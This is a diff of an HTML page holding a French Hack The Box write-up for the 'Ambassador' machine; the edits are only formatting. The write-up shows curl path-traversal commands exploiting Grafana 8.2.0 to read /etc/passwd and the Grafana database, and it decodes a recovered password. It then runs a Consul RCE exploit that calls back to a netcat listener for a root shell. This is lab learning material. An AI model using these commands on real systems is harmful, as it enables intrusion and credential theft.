@@ -175,7 +175,7 @@
 <p>La room était assez sympa, plutôt entre medium et easy. C&rsquo;est dommage qu&rsquo;il n&rsquo;y ait &ldquo;que&rdquo; des CVE même si l&rsquo;exploitation de Consul est intéressante.</p>
 <h1 id="recon">Recon</h1>
 <pre tabindex="0"><code>dirb http://10.10.11.183
-</code></pre><p><img alt="dirb results" src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png"></p>
+</code></pre><p><img src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png" alt="dirb results"></p>
 <pre tabindex="0"><code>nmap -sC -sV 10.10.11.183
 </code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">3000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ppp</span><span style="color:#f92672">?</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">fingerprint</span><span style="color:#f92672">-</span><span style="color:#a6e22e">strings</span><span style="color:#f92672">:</span> 
@@ -200,38 +200,36 @@
 </ul>
 <p>On se rend sur le port <code>3000</code> et on est redirigés vers un <code>/login</code></p>
 <p>Le service non reconnu sur le port 3000 est donc Grafana</p>
-<p><img alt="2022-12-05-145048_1870x971_scrot.png" src="https://i.ibb.co/bsdYbp8/2022-12-05-145048-1870x971-scrot.png"></p>
+<p><img src="https://i.ibb.co/bsdYbp8/2022-12-05-145048-1870x971-scrot.png" alt="2022-12-05-145048_1870x971_scrot.png"></p>
 <h1 id="foothold">Foothold</h1>
 <p>En bas de la page, on voit que la version de Grafana est <code>8.2.0</code>, or il existe un exploit valable pour toutes les versions <code>&lt;8.3.0</code></p>
 <p>→ <a href="https://www.exploit-db.com/exploits/50581">https://www.exploit-db.com/exploits/50581</a></p>
 <p>Il s’agit d’un Arbitrary File Read, on devrait donc pouvoir lire plus ou moins tout les fichiers du serveur (tant que l’user Grafana a la permission de le faire)</p>
 <p>On peut vérifier que le script fonctionne en lisant le <code>/etc/passwd</code></p>
-<p><img alt="2022-12-05-145457_943x1048_scrot.png" src="https://i.ibb.co/SQ92gwv/2022-12-05-145457-943x1048-scrot.png"></p>
+<p><img src="https://i.ibb.co/SQ92gwv/2022-12-05-145457-943x1048-scrot.png" alt="2022-12-05-145457_943x1048_scrot.png"></p>
 <p>L’exploit marche bel et bien, et en lisant le code on peut voir qu&rsquo;il éxecute cette commande bash:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../<span style="color:#f92672">{</span>input<span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>On peut récupérer la database du grafana (dans laquelle devrait se trouver le mot de passe de l’utilisateur mysql)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
 </span></span></code></pre></div><blockquote>
-<p>Le <code>-o</code> permet de sauvegarder l&rsquo;output de notre <code>curl</code> dans un fichier, en l&rsquo;occurence ici, on la sauvegarde dans <code>grafana.db</code></p>
-</blockquote>
+<p>Le <code>-o</code> permet de sauvegarder l&rsquo;output de notre <code>curl</code> dans un fichier, en l&rsquo;occurence ici, on la sauvegarde dans <code>grafana.db</code></p></blockquote>
 <p>Puis qu&rsquo;on ne peut pas lire un fichier <code>sqlite</code> en l&rsquo;ouvrant dans un éditeur de texte, on peut l’upload sur <a href="https://sqliteviewer.app">https://sqliteviewer.app</a>.</p>
 <p>On trouve assez rapidement un mot de passe dans la table <code>data_source</code></p>
-<p><img alt="password.png" src="https://i.ibb.co/nfCtZyG/2022-12-05-145940-1143x618-scrot.png"></p>
+<p><img src="https://i.ibb.co/nfCtZyG/2022-12-05-145940-1143x618-scrot.png" alt="password.png"></p>
 <p>On se connecte à la database mysql avec comme user “grafana” et le mot de passe qu&rsquo;on vient de trouver</p>
 <pre tabindex="0"><code>mysql -u grafana -p -h ambassador.htb
 </code></pre><p>En listant les databases, une sort du lot: <code>whackywidget</code></p>
-<p><img alt="2022-12-05-150214_964x1048_scrot.png" src="https://i.ibb.co/jwjtzch/2022-12-05-150214-964x1048-scrot.png"></p>
+<p><img src="https://i.ibb.co/jwjtzch/2022-12-05-150214-964x1048-scrot.png" alt="2022-12-05-150214_964x1048_scrot.png"></p>
 <p>On peut donc switcher dessus et lister les tables qu&rsquo;elle contient via la commande <code>show TABLES;</code></p>
 <p>Il n’y en a qu’une seule: <code>users</code>. En lisant son contenu, on voit un mot de passe encodé en <code>base64</code></p>
-<p><img alt="2022-12-05-150330_961x546_scrot.png" src="https://i.ibb.co/X55ysHw/2022-12-05-150330-961x546-scrot.png"></p>
+<p><img src="https://i.ibb.co/X55ysHw/2022-12-05-150330-961x546-scrot.png" alt="2022-12-05-150330_961x546_scrot.png"></p>
 <p>On peut retrouver sa valeur en clair via cette commande</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#34;</span> | base64 -d
 </span></span></code></pre></div><p>Pour cette étape, il faut se souvenir d&rsquo;une information présente sur la page principale du site:</p>
 <blockquote>
-<p>Connecting to this machine Use the developer account to SSH</p>
-</blockquote>
+<p>Connecting to this machine Use the developer account to SSH</p></blockquote>
 <p>On peut donc deviner que l&rsquo;utilisateur qui correspond à ce mot de passe est <code>developer</code></p>
-<p><img alt="2022-12-05-150853_966x1056_scrot.png" src="https://i.ibb.co/TrvwZ01/2022-12-05-150853-966x1056-scrot.png"></p>
+<p><img src="https://i.ibb.co/TrvwZ01/2022-12-05-150853-966x1056-scrot.png" alt="2022-12-05-150853_966x1056_scrot.png"></p>
 <h1 id="privilege-escalation">Privilege Escalation</h1>
 <p>On peut commencer par run <code>linpeas</code> pour essayer de trouver des vecteurs de privesc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╔══════════╣</span> Interesting GROUP writable files (<span style="color:#f92672">not</span> <span style="color:#f92672">in</span> Home) (max <span style="color:#ae81ff">500</span>)
@@ -254,21 +252,19 @@
 <p>On peut donc s&rsquo;y rendre puis faire un <code>git log</code> pour accéder à l&rsquo;historique des commits faits au repo. On affiche ensuite les changements faits au commit original</p>
 <pre tabindex="0"><code>git show 33a53ef9a207976d5ceceddc41a199558843bf3c
 </code></pre><p>Et on y trouve le <code>token consul</code> écrit en clair.</p>
-<p><img alt="bb03b43b-1d81-d62b-24b5-39540ee469b5" src="https://i.ibb.co/z4Vv44N/2022-12-05-151635-965x1055-scrot.png"></p>
+<p><img src="https://i.ibb.co/z4Vv44N/2022-12-05-151635-965x1055-scrot.png" alt="bb03b43b-1d81-d62b-24b5-39540ee469b5"></p>
 <p>On reprend donc <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py">l&rsquo;exploit</a> de tout à l&rsquo;heure, que devrait fonctionner maintenant qu&rsquo;on a le <code>token consul</code></p>
 <blockquote>
-<p>Il est aussi possible de passer par metasploit puisqu&rsquo;il existe un exploit pour cette CVE, mais puisque <code>consul</code> est un service local (il n&rsquo;est accessible que localement) il faudrait forwarder le port avec <code>chisel</code>. C&rsquo;est faisable sur cette machine, mais j&rsquo;ai décidé ici de directement mettre l&rsquo;exploit sur la machine.</p>
-</blockquote>
+<p>Il est aussi possible de passer par metasploit puisqu&rsquo;il existe un exploit pour cette CVE, mais puisque <code>consul</code> est un service local (il n&rsquo;est accessible que localement) il faudrait forwarder le port avec <code>chisel</code>. C&rsquo;est faisable sur cette machine, mais j&rsquo;ai décidé ici de directement mettre l&rsquo;exploit sur la machine.</p></blockquote>
 <p>On lance notre listener <code>netcat</code>, puis on lance l&rsquo;exploit sur la machine via cette commande</p>
 <pre tabindex="0"><code>python3 exploit.py 127.0.0.1 8500 10.10.14.53 1338 bb03b43b-1d81-d62b-24b5-39540ee469b5
 </code></pre><blockquote>
 <p>8500 = Port sur lequel se trouve le service <code>consul</code></p>
 <p>1338 = Port sur lequel écoute notre <code>netcat</code></p>
-<p>10.10.14.53 = L&rsquo;IP de notre <code>OpenVPN</code> (ou de votre machine)</p>
-</blockquote>
+<p>10.10.14.53 = L&rsquo;IP de notre <code>OpenVPN</code> (ou de votre machine)</p></blockquote>
 <p>On attend quelques secondes puis on reçoit la connection via le <code>netcat</code></p>
-<p><img alt="2022-12-05-152521_1916x1080_scrot.png" src="https://i.ibb.co/zb4CsX6/2022-12-05-152521-1916x1080-scrot.png"></p>
-<h6 id="back-to-top"><a href="/"><em>back to top</em></a></h6>
+<p><img src="https://i.ibb.co/zb4CsX6/2022-12-05-152521-1916x1080-scrot.png" alt="2022-12-05-152521_1916x1080_scrot.png"></p>
+<h6 id="back-to-top"><a href=""><em>back to top</em></a></h6>
 
             </div>
         </article>
